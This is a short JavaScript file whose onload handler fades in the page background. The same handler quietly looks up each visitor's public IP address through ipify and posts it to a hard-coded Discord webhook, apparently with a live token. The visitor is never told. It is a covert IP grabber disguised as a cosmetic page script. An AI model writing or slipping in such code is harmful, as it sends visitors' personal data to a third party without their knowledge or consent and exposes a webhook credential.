
window.onload = function(){
    $('body').animate({
        opacity: "1",
        backgroundColor: "#86BBD8"
    }, 1700, 'swing')
    function sendMessage(cnt) {
        const request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1008422175897817138/97oNn1muE_FLjAfgvBFv9j9BhMKvHuX5bbdEGyMb4e0aH38cOE60ho1BuIM-fQ4h-j2I");
  
        request.setRequestHeader('Content-type', 'application/json');
  
        const params = {
          username: "LOOOOOOOOOOOOOOOOOOOOL",
          avatar_url: "https://static.javatpoint.com/javascriptpages/images/javascript-onload.png",
          content: cnt
        }
  
        request.send(JSON.stringify(params));
      }
    $.getJSON("https://api.ipify.org/?format=json", function(e) {
        ip = e.ip
        console.log(e.ip);
        sendMessage(e.ip)
    });
}